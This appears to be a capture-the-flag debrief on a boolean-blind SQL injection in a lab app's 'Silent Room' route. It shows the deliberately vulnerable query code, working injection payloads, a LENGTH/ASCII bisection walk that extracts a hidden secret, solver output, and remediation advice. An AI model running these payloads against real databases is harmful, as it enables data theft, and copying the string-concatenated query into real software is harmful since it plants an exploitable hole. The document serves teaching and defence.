# Trick Tower, Silent Room, Debrief

**Node:** `p1_4` &middot; **Flag:** `SEIYAKU{yes_or_no_is_enough}` &middot; **Route:** `GET /p1/silent` &middot; **Sink:** `challenges/phase1.py`, `mariadb` (`door` table, `keeper` table)

## Root cause

The door check builds its query the same way every other floor on this
exam does, raw f-string concatenation, no escaping:

```python
# challenges/phase1.py
q = f"SELECT 1 FROM door WHERE code='{code}'"  # VULN: string concat
cur.execute(q)
result = cur.fetchone() is not None
```

That alone is the familiar sink. What makes this floor different from
p1_1/p1_2/p1_3 is what happens on either side of it:

```python
except Exception:
    result = False   # errors fold into the same FAIL as a clean false
```

There is no result set to read (unlike p1_3's `UNION`) and no raw
exception text echoed to the page (unlike p1_2's `extractvalue()`). The
only thing that ever leaves the server is one of two words,
`PASS` or `FAIL`, rendered by `templates/p1_silent.html` in an otherwise
identical panel. A malformed query (a stray quote, bad syntax) throws an
exception that is caught and folded into `FAIL`, exactly like a clean,
syntactically-valid false condition. That's what makes this a genuinely
**boolean-blind** oracle rather than an error-based one: true and false
render identically apart from one word, and a broken query never creates
a third, distinguishable state.

## The technique: boolean-blind extraction

Boolean-blind SQL injection never reads data directly. It only ever asks
the database yes/no questions and watches which of two possible responses
comes back. Any condition that can be expressed as SQL, `1=1`,
`SUBSTRING(x,N,1)='c'`, `ASCII(SUBSTRING(x,N,1))>=64`, can be folded
into the query's own `WHERE` clause and answered with a single bit. Given
enough bits, arbitrarily large hidden values can be reconstructed one
character (or even one bisection step) at a time.

The walk always has two phases:

1. **Confirm the injection point and the oracle's silence.** Force the
   condition true, force it false, and confirm a malformed query reads
   identically to a clean false.
2. **Fold a real question about hidden data into the same boolean shape,**
   then walk it across every position of the secret you want to recover.

## The walk (verified live against this exact seed)

**1. Confirm injection + silence.** The base query is
`SELECT 1 FROM door WHERE code='{code}'`. Closing the string and OR-ing in
an always-true or always-false condition doesn't depend on knowing any
real door code:

```
/p1/silent?code=' OR 1=1-- -
```

renders the exact same panel, with the word:

```
PASS
```

```
/p1/silent?code=' OR 1=2-- -
```

renders:

```
FAIL
```

And a deliberately malformed payload, an unbalanced quote with no
trailing comment to neutralize the rest of the literal,

```
/p1/silent?code=' OR 1=1
```

(the app's own trailing `'` after `{code}` is left dangling, an
unterminated string constant) throws a MariaDB syntax error server-side,
which the route's `except` block folds straight into:

```
FAIL
```

, indistinguishable from the honest `' OR 1=2-- -` false above. This is
the confirmation that matters most for this floor: an attacker gets
*zero* extra signal from breaking the query. The oracle really is just
one bit, always.

**2. Fold the hidden secret into the same boolean.** `keeper.secret` is
never selected by any legitimate query this app makes, it only becomes
reachable by writing a subquery against it and folding the result into
the `door` query's own `WHERE` clause via `OR`:

```
/p1/silent?code=' OR LENGTH((SELECT secret FROM keeper LIMIT 1))>=15-- -
```

Bisecting on `>=` against `LENGTH(...)` finds the exact length without
ever reading a character, against this seed, that converges on
**28**. Then, for each position `1..28`, the same trick applied to one
character at a time:

```
/p1/silent?code=' OR ASCII(SUBSTRING((SELECT secret FROM keeper LIMIT 1),1,1))>=83-- -
```

`ASCII(SUBSTRING(secret,N,1))>=mid` bisected over the printable range
(32–126) pins down the exact byte at position `N` in `ceil(log2(95))`
(about 7) requests, instead of testing every possible character in the
flag's alphabet one at a time. Position 1 converges on ASCII 83 = `'S'`;
walking every position from 1 to 28 the same way and reassembling the
bytes recovers, verbatim, the whole secret:

```
SEIYAKU{yes_or_no_is_enough}
```

`solvers/p1_4.py` runs exactly this walk end-to-end, length bisection,
then per-position ASCII bisection, against the live stack and reassembles
the flag one character at a time; a run against this seed prints each
position as it's recovered:

```
[p1_4] step 1, discover secret length via LENGTH() bisection
  ok: LENGTH(keeper.secret) = 28
[p1_4] step 2, walk the secret char-by-char via SUBSTRING()/ASCII() bisection
  position  1: 'S'  (so far: 'S')
  position  2: 'E'  (so far: 'SE')
  position  3: 'I'  (so far: 'SEI')
  position  4: 'Y'  (so far: 'SEIY')
  position  5: 'A'  (so far: 'SEIYA')
  ...
  position 28: '}'  (so far: 'SEIYAKU{yes_or_no_is_enough}')
[p1_4] recovered secret: SEIYAKU{yes_or_no_is_enough}
```

No error text, no extra row, no timing trick required, every character
above came from nothing but a sequence of PASS/FAIL answers.

## HxH analogy

Gon's candle-guessing game with Kite never shows him what's inside a box,
and it never explains a wrong guess, it just says no, in exactly the
tone it would use whether Gon guessed the wrong object or asked a
question the game didn't even recognize as a real guess. The only way to
win is to stop expecting the game to describe anything, and start
treating every question as one bit of information: does the box's
contents satisfy *this* narrower condition, yes or no? Ask cleverly
enough, narrow the space fast enough, and a box that never once shows
you what's inside still ends up fully identified.

The Silent Room's door has the identical shape. It was built to never
describe anything about itself, no result, no error, just a flat
PASS/FAIL. But "never describes itself" and "reveals nothing" aren't the
same property. A `WHERE` clause is still a boolean expression, and any
boolean expression can be answered, including one that silently asks
about a value the door was never supposed to expose at all. The door
isn't broken because it talks too much, like p1_2's error channel. It's
broken because a single honest bit, asked enough times in the right
order, is already enough.

## Remediation

- **Parameterized queries, always**, the same root fix as every floor on
  this exam:

  ```python
  cur.execute("SELECT 1 FROM door WHERE code=%s", (code,))
  ```

  With `code` passed as a bound parameter, it can never break out of the
  string literal, `OR`, `SUBSTRING`, `ASCII`, all of it depend entirely
  on attacker text being re-parsed as SQL grammar, which parameterization
  removes as a possibility outright.
- **Never let query outcomes, even indirectly, leak the truth value of
  a condition touching secret data.** This is the lesson specific to
  boolean-blind: even with no error text and no extra rows, a route whose
  *shape* changes at all based on a query's success/failure is a usable
  oracle. The real fix isn't hiding the PASS/FAIL wording harder, it's
  making sure the query an attacker controls can never ask a true
  question about data it has no business touching in the first place
  (see parameterization above, plus least-privilege grants so even a
  successful injection can't reach `keeper` at all).
- **Consistent error handling so failures never create a third state.**
  This floor's route deliberately catches every exception and folds it
  into the same `FAIL` as an honest false, that's the correct pattern in
  general, not just a trick to make this challenge harder. An app that
  returns a distinguishable response (a different status code, a
  slightly different error page, even a different response time) for
  "query failed" versus "query succeeded but matched nothing" hands an
  attacker a free extra bit per request, on top of whatever the intended
  response already leaks.
